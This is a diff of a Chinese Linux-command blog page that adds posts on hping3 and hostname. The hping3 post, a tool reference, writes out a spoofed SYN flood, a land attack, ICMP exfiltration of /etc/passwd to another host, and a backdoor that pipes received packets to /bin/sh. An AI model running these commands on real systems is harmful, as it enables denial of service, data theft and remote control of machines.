@@ -145,7 +145,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">653</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">655</span></a>
 
   </li>
         <li class="menu-item menu-item-tags">
@@ -235,7 +235,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">653</span>
+          <span class="site-state-item-count">655</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -308,6 +308,276 @@
       
 
       
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yonghong.tech/linux-command/hping3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/logo.jpg">
+      <meta itemprop="name" content="王永红(Micheal Wang)">
+      <meta itemprop="description" content="记录自己学习和工作的点点滴滴，分享技术，分享感悟。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="永红的互联网手记">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/linux-command/hping3/" class="post-title-link" itemprop="url">【Linux 命令】hping3</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-09-25 08:00:00 08:00:00" itemprop="dateCreated datePublished" datetime="2020-09-25T08:00:00+08:00">2020-09-25 08:00:00</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-09-25 09:37:00 09:37:00" itemprop="dateModified" datetime="2020-09-25T09:37:00+08:00">2020-09-25 09:37:00</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Linux-%E5%91%BD%E4%BB%A4/" itemprop="url" rel="index"><span itemprop="name">Linux 命令</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus：</span>
+    
+    <a title="disqus" href="/linux-command/hping3/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="linux-command/hping3/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>4.4k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>4 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>测试网络及主机的安全</p>
+<h2 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h2><p><strong>hping</strong> 是用于生成和解析TCPIP协议数据包的开源工具。创作者是Salvatore Sanfilippo。目前最新版是hping3，支持使用tcl脚本自动化地调用其API。hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。</p>
+<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yum install libpcap-devel tc-devel</span><br><span class="line">ln -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h</span><br><span class="line">wget http://www.hping.org/hping3-20051105.tar.gz</span><br><span class="line">tar zxvf hping3-20051105.tar.gz</span><br><span class="line">cd hping3-20051105</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
+<h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">-H --help 显示帮助。</span><br><span class="line">-v -VERSION 版本信息。</span><br><span class="line">-c --count count 发送数据包的次数 关于countreached_timeout 可以在hping2.h里编辑。</span><br><span class="line">-i --interval 包发送间隔时间（单位是毫秒）缺省时间是1秒,此功能在增加传输率上很重要,在idle/spoofing扫描时此功能也会被用到,你可以参考hping-howto获得更多信息-fast 每秒发10个数据包。</span><br><span class="line">-n -nmeric 数字输出，象征性输出主机地址。</span><br><span class="line">-q -quiet 退出。</span><br><span class="line">-I --interface interface name 无非就是eth0之类的参数。</span><br><span class="line">-v --verbose 显示很多信息，TCP回应一般如：len=46 ip=192.168.1.1 flags=RADF seq=0 ttl=255 id=0 win=0 rtt=0.4ms tos=0 iplen=40 seq=0 ack=1380893504 sum=2010 urp=0</span><br><span class="line">-D --debug 进入debug模式当你遇到麻烦时，比如用HPING遇到一些不合你习惯的时候，你可以用此模式修改HPING，（INTERFACE DETECTION,DATA LINK LAYER ACCESS,INTERFACE SETTINGS,.......）</span><br><span class="line">-z --bind 快捷键的使用。</span><br><span class="line">-Z --unbind 消除快捷键。</span><br><span class="line">-O --rawip RAWIP模式，在此模式下HPING会发送带数据的IP头。</span><br><span class="line">-1 --icmp ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。</span><br><span class="line">-2 --udp UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport --destport --keep选项指定其模式。</span><br><span class="line">-9 --listen signatuer hping的listen模式，用此模式，HPING会接收指定的数据。</span><br><span class="line">-a --spoof hostname 伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。</span><br><span class="line">-t --ttl time to live 可以指定发出包的TTL值。</span><br><span class="line">-H --ipproto 在RAW IP模式里选择IP协议。</span><br><span class="line">-w --WINID UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。</span><br><span class="line">-r --rel 更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。</span><br><span class="line">-F --FRAG 更改包的FRAG，这可以测试对方对于包碎片的处理能力，缺省的“virtual mtu”是16字节。</span><br><span class="line">-x --morefrag 此功能可以发送碎片使主机忙于恢复碎片而造成主机的拒绝服务。</span><br><span class="line">-y -dontfrag 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。</span><br><span class="line">-G --fragoff fragment offset value set the fragment offset</span><br><span class="line">-m --mtu mtu value 用此项后ID数值变得很大，50000没指定此项时3000-20000左右。</span><br><span class="line">-G --rroute 记录路由，可以看到详悉的数据等等，最多可以经过9个路由，即使主机屏蔽了ICMP报文。</span><br><span class="line">-C --ICMPTYPE type 指定ICMP类型，缺省是ICMP echo REQUEST。</span><br><span class="line">-K --ICMPCODE CODE 指定ICMP代号，缺省0。</span><br><span class="line">--icmp-ipver 把IP版本也插入IP头。</span><br><span class="line">--icmp-iphlen 设置IP头的长度，缺省为5（32字节）。</span><br><span class="line">--icmp-iplen 设置IP包长度。</span><br><span class="line">--icmp-ipid 设置ICMP报文IP头的ID，缺省是RANDOM。</span><br><span class="line">--icmp-ipproto 设置协议的，缺省是TCP。</span><br><span class="line">-icmp-cksum 设置校验和。</span><br><span class="line">-icmp-ts alias for --icmptype 13 (to send ICMP timestamp requests)</span><br><span class="line">--icmp-addr Alias for --icmptype 17 (to send ICMP address mask requests)</span><br><span class="line">-s --baseport source port hping 用源端口猜测回应的包，它从一个基本端口计数，每收一个包，端口也加1，这规则你可以自己定义。</span><br><span class="line">-p --deskport [+][+]desk port 设置目标端口，缺省为0，一个加号设置为:每发送一个请求包到达后，端口加1，两个加号为：每发一个包，端口数加1。</span><br><span class="line">--keep 上面说过了。</span><br><span class="line">-w --win 发的大小和windows一样大，64BYTE。</span><br><span class="line">-O --tcpoff Set fake tcp data offset. Normal data offset is tcphdrlen / 4.</span><br><span class="line">-m --tcpseq 设置TCP序列数。</span><br><span class="line">-l --tcpck 设置TCP ack。</span><br><span class="line">-Q --seqnum 搜集序列号的，这对于你分析TCP序列号有很大作用。</span><br></pre></td></tr></table></figure>
+
+<h3 id="Hping3功能"><a href="#Hping3功能" class="headerlink" title="Hping3功能"></a>Hping3功能</h3><p>Hping3主要有以下典型功能应用：</p>
+<h3 id="防火墙测试"><a href="#防火墙测试" class="headerlink" title="#  防火墙测试"></a>#  防火墙测试</h3><p>使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。请参考：<span class="exturl" data-url="aHR0cDovLzBkYXlzZWN1cml0eS5jb20vYXJ0aWNsZXMvaHBpbmczX2V4YW1wbGVzLmh0bWw=">http://0daysecurity.com/articles/hping3_examples.html<i class="fa fa-external-link-alt"></i></span></p>
+<p>测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -S  -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="# 端口扫描"></a># 端口扫描</h3><p>Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -I eth0  -S 192.168.10.1 -p 80</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>-I eth0</code>指定使用eth0端口，<code>-S</code>指定TCP包的标志位SYN，<code>-p 80</code>指定探测的目的端口。</p>
+<p>hping3支持非常丰富的端口探测方式，nmap拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。</p>
+<h3 id="Idle扫描"><a href="#Idle扫描" class="headerlink" title="# Idle扫描"></a># Idle扫描</h3><p>Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。</p>
+<p>该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。</p>
+<h3 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="# 拒绝服务攻击"></a># 拒绝服务攻击</h3><p>使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000</span><br></pre></td></tr></table></figure>
+
+<p>其他攻击如smurf、teardrop、land attack等也很容易构建出来。</p>
+<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="# 文件传输"></a># 文件传输</h3><p>Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 192.168.1.159--listen signature --safe  --icmp</span><br></pre></td></tr></table></figure>
+
+<p>监听ICMP包中的签名，根据签名解析出文件内容。</p>
+<p>在发送端使用签名打包的ICMP包发送文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 192.168.1.108--icmp ?d 100 --sign signature --file /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>将<code>/etc/passwd</code>密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。</p>
+<h3 id="木马功能"><a href="#木马功能" class="headerlink" title="# 木马功能"></a># 木马功能</h3><p>如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。</p>
+<p>示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。</p>
+<p>在木马启动端：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 192.168.10.66--listen signature --safe --udp -p 53 | /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>在远程控制端：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo ls &gt;test.cmd</span><br><span class="line">hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd</span><br></pre></td></tr></table></figure>
+
+<p>将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。</p>
+<p>当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。</p>
+<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yonghong.tech/linux-command/hostname/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/logo.jpg">
+      <meta itemprop="name" content="王永红(Micheal Wang)">
+      <meta itemprop="description" content="记录自己学习和工作的点点滴滴，分享技术，分享感悟。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="永红的互联网手记">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/linux-command/hostname/" class="post-title-link" itemprop="url">【Linux 命令】hostname</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-09-25 08:00:00 08:00:00" itemprop="dateCreated datePublished" datetime="2020-09-25T08:00:00+08:00">2020-09-25 08:00:00</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-09-25 09:36:30 09:36:30" itemprop="dateModified" datetime="2020-09-25T09:36:30+08:00">2020-09-25 09:36:30</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Linux-%E5%91%BD%E4%BB%A4/" itemprop="url" rel="index"><span itemprop="name">Linux 命令</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus：</span>
+    
+    <a title="disqus" href="/linux-command/hostname/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="linux-command/hostname/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>434</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>显示和设置系统的主机名</p>
+<h2 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h2><p><strong>hostname命令</strong> 用于显示和设置系统的主机名称。环境变量HOSTNAME也保存了当前的主机名。在使用hostname命令设置主机名后，系统并不会永久保存新的主机名，重新启动机器之后还是原来的主机名。如果需要永久修改主机名，需要同时修改<code>/etc/hosts</code>和<code>/etc/sysconfig/network</code>的相关内容。</p>
+<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname(选项)(参数)</span><br></pre></td></tr></table></figure>
+
+<h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-v：详细信息模式；</span><br><span class="line">-a：显示主机别名；</span><br><span class="line">-d：显示DNS域名；</span><br><span class="line">-f：显示FQDN名称；</span><br><span class="line">-i：显示主机的ip地址；</span><br><span class="line">-s：显示短主机名称，在第一个点处截断；</span><br><span class="line">-y：显示NIS域名。</span><br></pre></td></tr></table></figure>
+
+<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>主机名：指定要设置的主机名。</p>
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@AY1307311912260196fcZ ~]# hostname</span><br><span class="line">AY1307311912260196fcZ</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> change hostname</span></span><br><span class="line">hostname newname # for now</span><br><span class="line">vi /etc/hosts # forever</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
+
+
+<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
     
 
 
@@ -1339,262 +1609,6 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yonghong.tech/linux-command/gzip/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/logo.jpg">
-      <meta itemprop="name" content="王永红(Micheal Wang)">
-      <meta itemprop="description" content="记录自己学习和工作的点点滴滴，分享技术，分享感悟。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="永红的互联网手记">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/linux-command/gzip/" class="post-title-link" itemprop="url">【Linux 命令】gzip</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2020-09-25 08:00:00 08:00:00" itemprop="dateCreated datePublished" datetime="2020-09-25T08:00:00+08:00">2020-09-25 08:00:00</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-09-25 09:32:00 09:32:00" itemprop="dateModified" datetime="2020-09-25T09:32:00+08:00">2020-09-25 09:32:00</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Linux-%E5%91%BD%E4%BB%A4/" itemprop="url" rel="index"><span itemprop="name">Linux 命令</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus：</span>
-    
-    <a title="disqus" href="/linux-command/gzip/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="linux-command/gzip/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>1.2k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>用来压缩文件</p>
-<h2 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h2><p><strong>gzip命令</strong> 用来压缩文件。gzip是个使用广泛的压缩程序，文件经它压缩过后，其名称后面会多处“.gz”扩展名。</p>
-<p>gzip是在Linux系统中经常使用的一个对文件进行压缩和解压缩的命令，既方便又好用。gzip不仅可以用来压缩大的、较少使用的文件以节省磁盘空间，还可以和tar命令一起构成Linux操作系统中比较流行的压缩文件格式。据统计，gzip命令对文本文件有60%～70%的压缩率。减少文件大小有两个明显的好处，一是可以减少存储空间，二是通过网络传输文件时，可以减少传输的时间。</p>
-<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip(选项)(参数)</span><br></pre></td></tr></table></figure>
-
-<h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-a或——ascii：使用ASCII文字模式；</span><br><span class="line">-d或--decompress或----uncompress：解开压缩文件；</span><br><span class="line">-f或——force：强行压缩文件。不理会文件名称或硬连接是否存在以及该文件是否为符号连接；</span><br><span class="line">-h或——help：在线帮助；</span><br><span class="line">-l或——list：列出压缩文件的相关信息；</span><br><span class="line">-L或——license：显示版本与版权信息；</span><br><span class="line">-n或--no-name：压缩文件时，不保存原来的文件名称及时间戳记；</span><br><span class="line">-N或——name：压缩文件时，保存原来的文件名称及时间戳记；</span><br><span class="line">-q或——quiet：不显示警告信息；</span><br><span class="line">-r或——recursive：递归处理，将指定目录下的所有文件及子目录一并处理；</span><br><span class="line">-S或&lt;压缩字尾字符串&gt;或----suffix&lt;压缩字尾字符串&gt;：更改压缩字尾字符串；</span><br><span class="line">-t或——test：测试压缩文件是否正确无误；</span><br><span class="line">-v或——verbose：显示指令执行过程；</span><br><span class="line">-V或——version：显示版本信息；</span><br><span class="line">-&lt;压缩效率&gt;：压缩效率是一个介于1~9的数值，预设值为“6”，指定愈大的数值，压缩效率就会愈高；</span><br><span class="line">--best：此参数的效果和指定“-9”参数相同；</span><br><span class="line">--fast：此参数的效果和指定“-1”参数相同。</span><br><span class="line">-num 用指定的数字num调整压缩的速度，-1或--fast表示最快压缩方法（低压缩比），-9或--best表示最慢压缩方法（高压缩比）。系统缺省值为6。</span><br></pre></td></tr></table></figure>
-
-<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>文件列表：指定要压缩的文件列表。</p>
-<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>把test6目录下的每个文件压缩成.gz文件</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip *</span><br></pre></td></tr></table></figure>
-
-<p>把上例中每个压缩的文件解压，并列出详细的信息</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -dv *</span><br></pre></td></tr></table></figure>
-
-<p>详细显示例1中每个压缩的文件的信息，并不解压</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -l *</span><br></pre></td></tr></table></figure>
-
-<p>压缩一个tar备份文件，此时压缩文件的扩展名为.tar.gz</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -r log.tar</span><br></pre></td></tr></table></figure>
-
-<p>递归的压缩目录</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -rv test6</span><br></pre></td></tr></table></figure>
-
-<p>这样，所有test下面的文件都变成了*.gz，目录依然存在只是目录里面的文件相应变成了*.gz.这就是压缩，和打包不同。因为是对目录操作，所以需要加上-r选项，这样也可以对子目录进行递归了。</p>
-<p>递归地解压目录</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -dr test6</span><br></pre></td></tr></table></figure>
-
-
-<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yonghong.tech/linux-command/gzexe/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/logo.jpg">
-      <meta itemprop="name" content="王永红(Micheal Wang)">
-      <meta itemprop="description" content="记录自己学习和工作的点点滴滴，分享技术，分享感悟。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="永红的互联网手记">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/linux-command/gzexe/" class="post-title-link" itemprop="url">【Linux 命令】gzexe</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
